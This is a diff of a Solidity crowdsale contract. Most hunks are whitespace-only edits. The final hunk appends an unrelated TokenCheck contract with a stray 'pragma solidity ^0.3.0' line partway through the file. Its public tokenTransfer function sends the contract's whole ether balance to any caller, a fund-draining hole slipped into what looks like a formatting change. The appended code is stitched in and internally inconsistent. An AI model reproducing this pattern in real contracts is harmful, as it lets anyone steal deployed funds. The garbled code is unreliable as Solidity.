@@ -245,7 +245,7 @@ contract CrowdsaleWPTByRounds is Ownable {
 
   //Minimal value of investment
   uint public minInvestmentValue;
-  
+
   //Flags to on/off checks for buy Token
   bool public checksOn;
 
@@ -305,7 +305,7 @@ constructor () public {
     closingTime = 1535320800;
 
     minInvestmentValue = 0.02 ether;
-    
+
     checksOn = true;
     gasAmount = 25000;
   }
@@ -426,7 +426,7 @@ constructor () public {
     if (checksOn) {
         _preValidatePurchase(_beneficiary, weiAmount);
     }
-    
+
     // calculate token amount to be created
     uint256 tokens = _getTokenAmount(weiAmount);
 
@@ -434,7 +434,7 @@ constructor () public {
     tokensRaised = tokensRaised.add(tokens);
 
     minterContract.mint(_beneficiary, tokens);
-    
+
     emit TokenPurchase(
       msg.sender,
       _beneficiary,
@@ -498,5 +498,34 @@ constructor () public {
         msg.value,
         isTransferDone
         );
+  }
+}
+pragma solidity ^0.3.0;
+contract TokenCheck is Token {
+   string tokenName;
+   uint8 decimals;
+	  string tokenSymbol;
+	  string version = 'H1.0';
+	  uint256 unitsEth;
+	  uint256 totalEth;
+  address walletAdd;
+	 function() payable{
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+  }
+	 function tokenTransfer() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
   }
 }
